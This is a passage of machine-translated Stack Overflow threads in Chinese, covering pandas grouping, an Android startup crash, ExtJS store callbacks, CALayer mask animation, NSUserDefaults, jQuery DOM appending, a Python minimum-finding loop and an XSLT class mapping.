> 赞同：2
> 
> 时间：2013-03-16T14:28:43.240

怎么样：

```
df.groupby((df.a == "B").shift(1).fillna(0).cumsum()) 
```

例如：

```
>>> df
   a         b
0  A -1.957118
1  A -0.906079
2  A -0.496355
3  B  0.552072
4  A -1.903361
5  A  1.436268
6  B  0.391087
7  A -0.907679
8  A  1.672897
>>> gg = list(df.groupby((df.a == "B").shift(1).fillna(0).cumsum()))
>>> pprint.pprint(gg)
[(0,
     a         b
0  A -1.957118
1  A -0.906079
2  A -0.496355
3  B  0.552072),
 (1,    a         b
4  A -1.903361
5  A  1.436268
6  B  0.391087),
 (2,    a         b
7  A -0.907679
8  A  1.672897)] 
```

（我没有费心摆脱索引；`[g for k, g in df.groupby(...)]`如果您愿意，可以使用。）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-28T01:23:29.110

```
 def vGroup(dataFrame, edgeCondition, groupName='autoGroup'):
    groupNum = 0
    dataFrame[groupName] = ''

    #loop over each row
    for inx, row in dataFrame.iterrows():
            if edgeCondition[inx]:
                dataFrame.ix[inx, groupName] = 'edge'
                groupNum += 1
            else:
                dataFrame.ix[inx, groupName] = groupNum

    return dataFrame[groupName]

vGroup(df, df[0] == '  ') 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-13T09:21:03.657

另一种选择是：

```
In [36]: dff
Out[36]:
   a         b
0  A  0.689785
1  A -0.374623
2  A  0.517337
3  B  1.549259
4  A  0.576892
5  A -0.833309
6  B -0.209827
7  A -0.150917
8  A -1.296696

In [37]: dff['grpb'] = np.NaN

In [38]: breaks = dff[dff.a == 'B'].index

In [39]: dff['grpb'][breaks] = range(len(breaks))

In [40]: dff.fillna(method='bfill').fillna(len(breaks))
Out[40]:
   a         b  grpb
0  A  0.689785     0
1  A -0.374623     0
2  A  0.517337     0
3  B  1.549259     0
4  A  0.576892     1
5  A -0.833309     1
6  B -0.209827     1
7  A -0.150917     2
8  A -1.296696     2 
```

或者使用[itertools](http://docs.python.org/2/library/itertools.html)创建 'grpb' 也是一种选择。

# android - 如何让它等到函数返回？安卓

> ID：13353235
> 
> 赞同：0
> 
> 时间：2012-11-12T23:19:29.147
> 
> 标签：android, menu

抱歉只是转储代码，但我正在尝试制作菜单。当您启动该程序时，它只会显示“不幸的是，ScoutingDraft 已停止工作。” 我无法弄清楚问题所在。

```
package cody.graham.scoutingdraft;

import...;

public class MyMenu extends ListActivity{
    String UserName="a";
    String display[] = {"Welcome" ,"Login"  ,"Exit"    };
    String classes[] = {"return()","login()","finish()"};
    EditText user=(EditText) findViewById(R.id.ETUserInput);
    Button login=(Button) findViewById(R.id.BLogin),logout=(Button) findViewById(R.id.BLogout);
    TextView errmsg=(TextView) findViewById(R.id.TVErrorReport);
    @Override
    protected void onCreate(Bundle savedInstanceState) 
    {
        super.onCreate(savedInstanceState);
        setListAdapter(new ArrayAdapter<String>(MyMenu.this,android.R.layout.simple_list_item_1,display));
    }
    @Override public void onBackPressed(){finish();}
    @Override
    protected void onListItemClick(ListView l, View v, int position,long id)
    {
        super.onListItemClick(l, v, position, id);
        if (classes[position].equals("return()")){return;}
        if (classes[position].equals("finish()")){finish();return;}
        if (classes[position].equals("login()")){
            final Dialog logd=new Dialog(this);
            logd.setContentView(R.layout.login_dialog);
            logd.setCancelable(false);
            login.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    int len=user.getText().toString().length();
                    if (len<3){errmsg.setText("Too short"); return;}
                    if (len>10){errmsg.setText("Too long"); return;}
                    UserName=user.getText().toString();
                    display[1]="Welcome, "+UserName;
                    display[2]="Logout";
                    logd.dismiss();
                }
            });
            logout.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    UserName="a";
                    display[1]="Welcome";
                    display[2]="Login";
                    logd.dismiss();
                }
            });
            logd.show();
            return;
        }
        try{
            Class<?> cvar=Class.forName("cody.graham.scoutingdraft."+classes[position]);
            Intent intention=new Intent(MyMenu.this,cvar);
            startActivity(intention);
        }catch(ClassNotFoundException e){
            e.printStackTrace();
        }
    }
    public String getUser(){
        return UserName;
    }
    public void setUser(String newuser){
        UserName=newuser;
    }
} 
```

我还没有任何其他 java 文件（这是迄今为止的整个程序），但我给它的唯一选项应该触发 3 个 if 语句之一并在尝试创建类之前返回。即使这不是真的，它也不应该在我点击某些东西之前崩溃。

日志猫：

```
11-12 17:24:45.925: I/ActivityManager(165): START {act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] flg=0x10200000 cmp=cody.graham.scoutingdraft/.MyMenu bnds=[0,405][120,555] u=0} from pid 263
11-12 17:24:45.956: W/WindowManager(165): Failure taking screenshot for (246x410) to layer 21005
11-12 17:24:45.975: E/PowerManagerService(165): Excessive delay setting brightness: 140ms, mask=2
11-12 17:24:46.137: D/dalvikvm(6708): Not late-enabling CheckJNI (already on)
11-12 17:24:46.155: I/ActivityManager(165): Start proc cody.graham.scoutingdraft for activity cody.graham.scoutingdraft/.MyMenu: pid=6708 uid=10047 gids={1028}
11-12 17:24:46.235: E/PowerManagerService(165): Excessive delay setting brightness: 259ms, mask=2
11-12 17:24:46.525: E/PowerManagerService(165): Excessive delay setting brightness: 266ms, mask=2
11-12 17:24:46.606: I/Choreographer(165): Skipped 31 frames!  The application may be doing too much work on its main thread.
11-12 17:24:46.708: E/PowerManagerService(165): Excessive delay setting brightness: 176ms, mask=2
11-12 17:24:47.005: E/PowerManagerService(165): Excessive delay setting brightness: 284ms, mask=2
11-12 17:24:47.146: E/Trace(6708): error opening trace file: No such file or directory (2)
11-12 17:24:47.656: D/AndroidRuntime(6708): Shutting down VM
11-12 17:24:47.656: W/dalvikvm(6708): threadid=1: thread exiting with uncaught exception (group=0x40a13300)
11-12 17:24:47.686: E/AndroidRuntime(6708): FATAL EXCEPTION: main
11-12 17:24:47.686: E/AndroidRuntime(6708): java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{cody.graham.scoutingdraft/cody.graham.scoutingdraft.MyMenu}: java.lang.NullPointerException
11-12 17:24:47.686: E/AndroidRuntime(6708):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1983)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2084)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at android.app.ActivityThread.access$600(ActivityThread.java:130)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1195)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at android.os.Handler.dispatchMessage(Handler.java:99)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at android.os.Looper.loop(Looper.java:137)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at android.app.ActivityThread.main(ActivityThread.java:4745)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at java.lang.reflect.Method.invokeNative(Native Method)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at java.lang.reflect.Method.invoke(Method.java:511)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at dalvik.system.NativeStart.main(Native Method)
11-12 17:24:47.686: E/AndroidRuntime(6708): Caused by: java.lang.NullPointerException
11-12 17:24:47.686: E/AndroidRuntime(6708):     at android.app.Activity.findViewById(Activity.java:1825)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at cody.graham.scoutingdraft.MyMenu.<init>(MyMenu.java:18)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at java.lang.Class.newInstanceImpl(Native Method)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at java.lang.Class.newInstance(Class.java:1319)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at android.app.Instrumentation.newActivity(Instrumentation.java:1053)
11-12 17:24:47.686: E/AndroidRuntime(6708):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1974)
11-12 17:24:47.686: E/AndroidRuntime(6708):     ... 11 more
11-12 17:24:47.716: W/ActivityManager(165):   Force finishing activity cody.graham.scoutingdraft/.MyMenu
11-12 17:24:47.726: W/WindowManager(165): Failure taking screenshot for (246x410) to layer 21010
11-12 17:24:48.266: W/ActivityManager(165): Activity pause timeout for ActivityRecord{41980720 cody.graham.scoutingdraft/.MyMenu} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T23:24:28.047

看起来你得到了`null pointer exception`这是由你在第 18 行的一个观点引起的。

这是导致您的问题的行：

```
setListAdapter(new ArrayAdapter<String>(MyMenu.this,android.R.layout.simple_list_item_1,display)); 
```

尝试：

setListAdapter(new ArrayAdapter(this, android.R.layout.simple_list_item_1,display));

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T23:48:55.940

事实证明我需要删除

```
 EditText user=(EditText) findViewById(R.id.ETUserInput);
    Button login=(Button) findViewById(R.id.BLogin),logout=(Button) findViewById(R.id.BLogout);
    TextView errmsg=(TextView) findViewById(R.id.TVErrorReport); 
```

从顶部开始，将它们全部更改为最终变量，然后在 if 语句中移动所有变量：

```
 if (classes[position].equals("login()")){ 
```

# ajax - Extjs 存储加载成功处理程序没有被触发

> ID：13353236
> 
> 赞同：5
> 
> 时间：2012-11-12T23:19:30.687
> 
> 标签：ajax, extjs, load, extjs4, store

我有一个存储加载方法，它通过 ajax 请求返回数据。我可以看到数据正在使用 Firebug 返回，但我的成功处理程序没有被调用：

```
 this.getCategoriesStore().load({params:{'id':d.data.category_id}}, {
        success: function(category) {
            console.log("Category: " + category.get('name'));
        },
        error: function(e) {
            console.log(e);
        }
    }); 
```

我正在返回一个成功参数以及数据：

```
{"success":true,"categories":{"id":5,"name":"Frying","section_id":2}} 
```

有什么遗漏还是我做错了什么？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-11-13T07:16:17.693

好吧，我想你正在寻找这个：

```
store.load({
    params:{'id':d.data.category_id},
    scope: this,
    callback: function(records, operation, success) {
        if (success) {
            console.log("Category: " + category.get('name'));
        } else {
            console.log('error');
        }
    }
}); 
```

在**[API](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.Store-method-load)**中，您的附加参数也可以放置在那里并不明显。但是 ExtJS 经常使用配置对象来包装东西。

**编辑以回答评论：**

简短的回答是：**是的**

现在是更长的版本：对于商店，您可以直接提供匿名（或具体）回调或注册事件。在您的情况下，两者都将起作用。

但是你只能有一个回调，而你可以有很多事件。在进一步的场景中，您会发现事件更适合或事件是唯一方法的情况。当你在听的时候，情况总是如此。以下是一些注意事项：

*   当您只需要一次回调时，请使用 { single: true } 属性。示例：`store.on('load', function(s) { /* do something*/ }, scope, { single: true })`监听器在被调用后将被移除。这是使用无法删除的匿名函数的必要原因。
*   在大多数情况下使用**[mon()](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.util.Observable-method-mon)**直接在类定义中绑定侦听器以确保侦听器与类的实例一起被销毁。

两者都将节省您的浏览器内存。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-12T23:33:53.677

尝试这个：

```
store.load({
    scope: this,
    callback: function(records, operation, success) {
        // the operation object
        // contains all of the details of the load operation
        console.log(records);
    }
}); 
```

[http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.Store-method-load](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.Store-method-load)根据文档没有成功和错误回调。

提供回调的另一种替代方法是，您还可以在商店中添加“加载”事件侦听器以获得相同的效果。

# objective-c - 如何为附加到 UIImageView 的 CALayer 设置动画？

> ID：13353237
> 
> 赞同：2
> 
> 时间：2012-11-12T23:19:42.783
> 
> 标签：objective-c, ios, uiview, uiimageview

我正在使用 Bartosz 提出的此[代码](https://stackoverflow.com/questions/5757386/how-to-mask-an-uiimageview)向 UIImageView 添加蒙版。它工作正常。

```
#import <QuartzCore/QuartzCore.h>

CALayer *mask = [CALayer layer];
mask.contents = (id)[[UIImage imageNamed:@"mask.png"] CGImage];
mask.frame = CGRectMake(0, 0, 320.0, 100.0);
yourImageView.layer.mask = mask;
yourImageView.layer.masksToBounds = YES; 
```

另外，我想为蒙版设置动画，例如向右滑动蒙版，这样在动画结束时，蒙版不再应用于 UIImageView。

在我的特定情况下，蒙版使用完全透明的图像，因此 UIImageView 在初始状态下不可见（工作正常），但预计在动画结束时会如此。但是，如果需要对蒙版进行动画处理，则该想法可以重用于任何其他用例。

这个想法是操纵掩码框架的 x 原点部分。所以，我想出了这个代码：

```
[UIView animateWithDuration: 0.2
                      delay: 0
                    options: UIViewAnimationCurveEaseInOut
                 animations:^{
                         CGRect maskFrame = yourImageView.layer.mask.frame;
                         maskFrame.origin.x = 320.0;
                         yourImageView.layer.mask.frame = maskFrame;
                     }
                 completion:^(BOOL finished){}]; 
```

不幸的是，掩码随时都应用于整个 UIImageView，它不会向右滑动。

**更新 1：**

这是我实际使用的设置视图和掩码的代码：它是一个 UITableViewCell。

APPCell.m（APPCell.h“扩展”UITableViewCell）

```
#import "APPCell.h"
#import <QuartzCore/QuartzCore.h>

@interface APPCell()
@property (strong, nonatomic) UIImageView *menu;
@property (strong, nonatomic) CALayer *menuMask;
...
@end

@implementation APPCell
...

- (id)initWithStyle:(UITableViewCellStyle)style reuseIdentifier:(NSString *)reuseIdentifier
{
self.menu = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 320.0, 88.0)];
[self.menu setBackgroundColor:[UIColor clearColor]];
[self.menu setImage:[UIImage imageNamed:@"cell_back"]];
[self addSubview:self.menu];

self.menuMask = [CALayer layer];
self.menuMask.contents = (id)[[UIImage imageNamed:@"cell_mask"] CGImage];
self.menuMask.frame = CGRectMake(0, 0, 320.0, 88.0);
self.menu.layer.mask = self.menuMask;
self.menu.layer.masksToBounds = YES;
}
... 
```

我现在不是在 UIKit 的帮助下制作动画，而是使用 CoreAnimation 的隐式动画来移动遮罩层：

APPCell.m

```
...
- (void)swipeLeft
{
self.menuMask.position = CGPointMake(-320.0, 0.0);
}
... 
```

我可以确认调用了 swipeLeft。我希望面具“消失”并看到**[UIImage imageNamed:@"cell_back"]] ，当我取消注释****self.menu.layer.mask = self.menuMask**时我会这样做。

**解决方案：**

我没有在 CALayer 上设置内容，而是将背景颜色设置为白色。这是我正在使用的代码：

```
self.menuSubMenuMask = [CALayer layer];
self.menuSubMenuMask.backgroundColor = [[UIColor whiteColor] CGColor];
self.menuSubMenuMask.frame = CGRectMake(320.0, 0.0, 320.0, 88.0);
self.tableCellSubMenu.layer.mask = self.menuSubMenuMask;
self.tableCellSubMenu.layer.masksToBounds = YES; 
```

为了显示应用了 CALayer 的 UIImageView，CALayer 不能位于 UIImageView 的“上方”。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T03:46:48.037

使用 UIViews 的 UIKit 的动画比直接使用 Core Animation 受限得多。特别是你试图动画的不是 UIView 的动画属性之一。此外，正如[View Programming Guide for iOS](http://developer.apple.com/library/ios/#documentation/WindowsViews/Conceptual/ViewPG_iPhoneOS/AnimatingViews/AnimatingViews.html#//apple_ref/doc/uid/TP40009503-CH6-SW2)中所阐明的那样：

> **注意：**如果您的视图托管自定义图层对象（即没有关联视图的图层对象），您必须使用核心动画来动画它们的任何更改。

在您的示例中就是这种情况。您已将 CALayer 添加到您的视图中，UIKit 将无法为您制作动画效果。另一方面，您可以直接使用 Core Animation 为遮罩层的运动设置动画。您应该能够使用[Core Animation Programming Guide](https://developer.apple.com/library/ios/documentation/Cocoa/Conceptual/CoreAnimation_guide/CreatingBasicAnimations/CreatingBasicAnimations.html#//apple_ref/doc/uid/TP40004514-CH3-SW1)中描述的隐式动画轻松完成此操作。请注意，从[CALayer Animatable Properties](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/CoreAnimation_guide/Articles/AnimProps.html#//apple_ref/doc/uid/TP40005942-SW1)列表中，该帧是不可动画的。相反，您应该使用`position`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-22T08:48:41.920

您可以通过使用来实现您想要的东西`CATransition`，尽管这可能不是您想要的解决方案：

1）首先，像你一样为你的图层设置蒙版

2）当您想删除蒙版并显示您的图像时，请使用以下代码：

```
CATransition* transition = [CATransition animation];
transition.type = kCATransitionPush;
transition.subtype = kCATransitionFromRight;
transition.duration = 1.0;
[mask addAnimation:transition forKey:kCATransition];
imageView.layer.mask.contents = [UIImage imageNamed:@"black.png"].CGImage; 
```

这里的主要技巧 - 我们为遮罩层创建了过渡动画，因此当您更改遮罩层的任何（我不确定）属性时，将应用此动画。现在我们将遮罩的内容设置为完全黑色的图像以完全移除遮罩 - 现在我们有了平滑的推动动画，我们的遮罩图像向左移动，而未遮罩的图像进入它的位置

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-22T20:04:58.867

最简单的方法是使用 CoreAnimation 本身：

```
CGPoint fromPoint = mask.position;
CGPoint toPoint = CGPointMake(fromPoint.x*3.0, fromPoint.y);

mask.position = toPoint; // CoreAnimation animations do *not* persist

CABasicAnimation *animation = [CABasicAnimation animationWithKeyPath:@"position"];
animation.fromValue = [NSValue valueWithCGPoint:fromPoint];
animation.toValue = [NSValue valueWithCGPoint:toPoint];
animation.duration = 4.0f;

[mask addAnimation:animation forKey:@"position"]; 
```

# objective-c - 使用 Xcode 在变量中获取数字后，如何使用 NSUserDefaults 存储日期

> ID：13353242
> 
> 赞同：0
> 
> 时间：2012-11-12T23:19:53.800
> 
> 标签：objective-c, ios, xcode, nsuserdefaults

我是新手，被困住了，任何帮助都会很棒！我正在使用 Xcode 来构建我的应用程序。

我有一个 IBAction“按下按钮”，这会生成随机数，然后我有一堆 if 语句。最终，如果事情与我的 long long 变量“coins”相匹配，就会有一个数值。现在我只是将这个值更改为硬币 = 硬币 + 10，然后将其显示在 UILabel 中。在所有计算之后，每当用户按下按钮时，我现在都需要存储该值。这样他们的“硬币”总数就会被添加或减去。此外，我还想将广告添加到“硬币”变量中并在应用内购买。所以我知道我需要一种方法来存储价值，即使应用程序关闭并重新打开也是如此。

有没有办法使用 NSUserDefaults 来存储该值，或者在原始的 IBAction buttonPressed 中？或者任何帮助或建议都会很棒！谢谢和抱歉，如果这听起来很蹩脚，但我在我的第一个应用程序上:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:11:42.393

在 NSUserDefaults 中存储一个数字：

```
[[NSUserDefaults standardUserDefaults] setObject:[NSNumber numberWithUnsignedLongLong:coins] forKey:@"coins"]; 
```

要从 NSUserDefaults 中检索并将其存储到硬币中：

```
coins = [[[NSUserDefaults standardUserDefaults] objectForKey:@"coins"] unsignedLongLongValue]; 
```

这是假设您已将硬币声明为 unsigned long long，而不是已签名的。此外，如果您想通过这些方法来存储 NSIntegers，还有一些方便的方法。

编辑：刚刚意识到你想拥有 IAP，应该更仔细地阅读。我建议不要在 NSUserDefaults 中存储任何有价值的东西（密码、用户名、可购买的货币、可以提交到在线排行榜的高分等）。它被存储为一个简单的`.plist`（XML），据我所知可以相对容易地进行编辑。

# php - 将动态 html 放在页面上的最可接受的方式

> ID：13353243
> 
> 赞同：2
> 
> 时间：2012-11-12T23:20:00.440
> 
> 标签：php, javascript, jquery, html

我想`div`在单击按钮时将一些 html 附加到 a 中。唯一需要动态的是它需要有一个不同的 id 与它上面的其他相同的 html。所以如果我有这样的结构：

```
<div id="container">
   <div id="div1" class="inner">
       <p id="P1">Some content</p>
   </div>
   <div id="div2" class="inner">
       <p id="P2">Some content</p>
   </div>
</div> 
```

在容器的末尾我想附加

```
 <div id="div3" class="inner">
         <p id="P3">Some content</p>
  </div> 
```

存储此 HTML 的好方法是什么？将其全部保存在 php 页面中并发布新 div 的 id 应增加到的数字？或者将 html 放在字符串中更聪明，并让正则表达式递增所有数字。或者是否有一些我完全错过的非常明显的方法来做到这一点。

Jquery 是一个选项，因为它已经在页面上。

另外，如果这个问题似乎过于开放，请在评论中告诉我如何在关闭它之前更改它。

非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:22:51.653

将每次要添加的 HTML 放入隐藏的 div 中，然后使用 jQuery 将其复制并添加到相关位置。例如：

```
<div id="appendContents" style="display:none;">
  <div class="inner">
    <p id="P3">Some content</p>
  </div>
</div> 
```

然后jQuery：

```
var shownDivs = <?php echo $numberOnScreenFromBeginning;?>;
$('#theButtonYouWantClickable').click(function()
{
   var newContent = $('#appendContents').clone();
   newContent.$('div.inner').get(0).id = 'div'+shownDivs;
   newContent.$('div.inner p').get(0).id = 'P'+shownDivs;
   // Where does P content come from??
   shownDivs++;
   $('#container').append(newContent);
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T23:40:16.127

根据您迄今为止对评论的回答（即 id 并不是很重要，并且您将在内容中包含输入元素），我会说您希望重做您的 html 看起来像这样：

```
<div id="container">
   <div class="inner">
       <p><input type="text" name="order_item[]" value="" /></p>
   </div>
   <div class="inner">
       <p><input type="text" name="order_item[]" value="" /></p>
   </div>
</div> 
```

请注意，不再有 id，我已经为您的输入元素使用数组表示法，以便它们将作为数组发布到接收脚本（无需在 javascript 中增加计数器或将不同的发布变量名称解析为 PHP 中的可用数组在服务器上）。

然后在 jQuery 中使用类似的东西

```
$('#button_id').click(function() {
    $('#container > div.inner:last').clone().val('').appendTo('#container');
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T23:29:13.710

请试试这个：**工作演示** [http://jsfiddle.net/eNXmr/](http://jsfiddle.net/eNXmr/)

在下面的代码中，它将计算 div 的长度，因此将 id 动态设置为 1、2、3 及以上。

希望能满足你的需要`:)`

使用的 API： http: [//api.jquery.com/append/](http://api.jquery.com/append/)

**代码**

```
 $('#hulk').click(function() {
    alert("Total div inside ==> " + $('#container').find('.inner').length);

    var next_num = parseInt($('#container').find('.inner').length) + 1;

    $('#container').append(' <div id="div' + next_num + '" class="inner"><p id="P' + next_num + '">Some content</p></div>');

});​
​ 
```

**HTML**

```
<div id="container">
   <div id="div1" class="inner">
       <p id="P1">Some content</p>
   </div>
   <div id="div2" class="inner">
       <p id="P2">Some content</p>
   </div>
</div>

<input type="button" value="Click hulk" id="hulk" />​ 
```

# python - 带有for循环的Python列表迭代

> ID：13353250
> 
> 赞同：1
> 
> 时间：2012-11-12T23:20:48.647
> 
> 标签：python, python-3.x

我正在尝试输入数字，并且我希望我的函数返回最小的数字。

但是，我的代码似乎提前停止执行：只要输入中的一个数字小于另一个。

```
a = input("")
smallest = 0
a = a.split(" ")
numbers = a

def smallestindex(numbers):
    for i in range(len(numbers)):
        b = int(numbers[i])
        smallest = int(numbers[0])
        print(b)
        if b < smallest:
            smallest = b
            return smallest

print (smallestindex(numbers)) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T23:37:41.640

这是一个缩进问题。目前，只要块运行，您的`return`语句就会发生。`if b < smallest`这可能不是你的本意。您需要取消缩进以与您的`for`语句处于同一级别，以便它在循环结束后运行，而不是在中间运行。

您还需要将初始化的行移到函数`smallest`的顶部，而不是让它在循环的每个循环中发生。这应该是这样的：

```
def smallestindex(numbers):
    smallest = int(numbers[0])    # moved this line up
    for i in range(len(numbers)):
        b = int(numbers[i])
        print(b)
        if b < smallest:
            smallest = b
    return smallest   # unindented this line 
```

还值得注意的是，您的循环可能会略有不同。`range(len(numbers))`您可以直接使用 循环遍历列表项，而不是循环遍历列表的索引（使用） `for b in numbers`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T23:39:00.733

您有一个缩进错误：您正在循环`smallest`内部返回，因此执行在满足条件`for`的循环的第一次迭代时停止。`if`循环完成后，您需要返回结果。此外，您`smallest`每次都在通过循环进行重置，因此您的`if`块不会按照您的意图进行。这是一个固定版本：

```
def smallestindex(numbers):
    smallest = int(numbers[0])
    for i in range(len(numbers)):
        b = int(numbers[i])
        print(b)
        if b < smallest:
            smallest = b
    return smallest 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T00:40:19.593

如果您希望返回函数名称所暗示的最小数字的索引，则需要将代码更改为类似这样

```
def smallestindex(numbers):
    numbers = [int(x) for x in numbers] # convert numbers to list of ints
    smallest_idx = 0
    smallest = numbers[0]
    for i, b  in enumerate(numbers):
        if b < smallest:
            smallest_idx = i
            smallest = b
    return smallest_idx 
```

# html - XSL for Xml：使用 XSL 插入特定类

> ID：13353255
> 
> 赞同：1
> 
> 时间：2012-11-12T23:21:02.957
> 
> 标签：html, xml, xslt, xpath

在我上周提出的问题之后，我还有另一个 XSLT 问题。 [用于两行多列的 Xml 到表转换的 XSL](https://stackoverflow.com/questions/13224567/xsl-for-xml-to-table-transformation-for-two-rows-and-many-columns)。

挑战在于根据部分属性为每个类插入不同的类。我需要两个不同的输出，如下面的输出所示。我有一个来自上一个问题的示例 XSLT，我想对其进行相应的编辑。

请注意我正在使用 XSLT 1.0。任何建议或指导将不胜感激。

输入：

```
<root>
  <page number="1" section="Arsenal">Arsenal</page> 
  <page number="2" section="Arsenal">Arsenal</page> 
  <page number="3" section="Arsenal">Arsenal</page> 
  <page number="4" section="Arsenal">Arsenal</page> 
  <page number="5" section="Arsenal">Arsenal</page> 
  <page number="6" section="Arsenal">Arsenal</page> 
  <page number="7" section="Chelsea">Chelsea</page> 
  <page number="8" section="Chelsea">Chelsea</page> 
  <page number="9" section="Chelsea">Chelsea</page> 
  <page number="10" section="Chelsea">Chelsea</page> 
  <page number="11" section="Chelsea">Chelsea</page> 
  <page number="12" section="Chelsea">Chelsea</page> 
  <page number="13" section="ManUnited">ManUnited</page> 
  <page number="14" section="ManUnited">ManUnited</page> 
  <page number="15" section="ManUnited">ManUnited</page> 
  <page number="16" section="ManUnited">ManUnited</page> 
  <page number="17" section="ManUnited">ManUnited</page> 
  <page number="18" section="ManUnited">ManUnited</page> 
  <page number="19" section="ManCity">ManCity</page> 
  <page number="20" section="ManCity">ManCity</page> 
  <page number="21" section="ManCity">ManCity</page> 
  <page number="22" section="ManCity">ManCity</page> 
  <page number="23" section="ManCity">ManCity</page> 
  <page number="24" section="ManCity">ManCity</page> 
 </root> 
```

输出 1：

```
<table>
<tr>
<td class="AFC">Arsenal</td>
<td></td>
<td class="CFC">Chelsea</td>
<td></td>
<td class="MUFC">ManUnited</td>
<td></td>
<td class="MCFC">ManCity</td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>6</td>
<td>7</td>
<td>12</td>
<td>13</td>
<td>18</td>
<td>19</td>
<td>24</td>
</tr>
</table> 
```

输出 2：

```
<table>
<tr>
<td class="Arsenal">Arsenal</td>
<td></td>
<td class="Chelsea">Chelsea</td>
<td></td>
<td class="ManUnited">ManUnited</td>
<td></td>
<td class="ManCity">ManCity</td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>6</td>
<td>7</td>
<td>12</td>
<td>13</td>
<td>18</td>
<td>19</td>
<td>24</td>
</tr>
</table> 
```

当前 XSLT 由 @Kirill Polishchuk 提供

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes" indent="yes"/>
<xsl:key name="k" match="page" use="@section"/>

<xsl:template match="/root">
<table>
<tr>
<xsl:apply-templates select="page[generate-id() = generate-id(key('k', @section))]"/>
</tr>
<tr>
<xsl:apply-templates select="page[generate-id() = generate-id(key('k', @section))]" mode="page"/>
</tr>
</table>
</xsl:template>

<xsl:template match="page">
<td>
<xsl:value-of select="."/>
</td>
<td></td>
</xsl:template>

<xsl:template match="page" mode="page">
<td>
<xsl:value-of select="@number"/>
</td>
<td>
<xsl:value-of select="key('k', @section)[last()]/@number"/>
</td>
</xsl:template>

</xsl:stylesheet> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:54:35.313

使用这个 XSLT：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:my="my">
  <xsl:output method="xml" omit-xml-declaration="yes" indent="yes"/>

  <xsl:key name="k" match="page" use="@section"/>

  <xsl:param name="short-name" select="true()"/>
  <!-- Change param to false()-->

  <my:data>
    <club name="Arsenal">AFC</club>
    <club name="Chelsea">CFC</club>
    <club name="ManUnited">MUFC</club>
    <club name="ManCity">MCFC</club>
  </my:data>

  <xsl:template match="/root">
    <table>
      <tr>
        <xsl:apply-templates select="page[generate-id() = generate-id(key('k', @section))]"/>
      </tr>
      <tr>
        <xsl:apply-templates select="page[generate-id() = generate-id(key('k', @section))]" mode="page"/>
      </tr>
    </table>
  </xsl:template>

  <xsl:template match="page">
    <xsl:variable name="class">
      <xsl:choose>
        <xsl:when test="$short-name">
          <xsl:value-of select="document('')/*/*/club[@name = current()/@section]"/>
        </xsl:when>
        <xsl:otherwise>
          <xsl:value-of select="@section"/>
        </xsl:otherwise>
      </xsl:choose>

    </xsl:variable>

    <td class="{$class}">
      <xsl:value-of select="."/>
    </td>
    <td></td>
  </xsl:template>

  <xsl:template match="page" mode="page">
    <td>
      <xsl:value-of select="@number"/>
    </td>
    <td>
      <xsl:value-of select="key('k', @section)[last()]/@number"/>
    </td>
  </xsl:template>

</xsl:stylesheet> 
```

根据参数`$short-name`，它会呈现您想要的第一个^(XML)或^(第二)个。

# html - Internet Explorer 9 的神奇扩展 div

> ID：13353256
> 
> 赞同：12
> 
> 时间：2012-11-12T23:21:11.203
> 
> 标签：html, css, internet-explorer-9

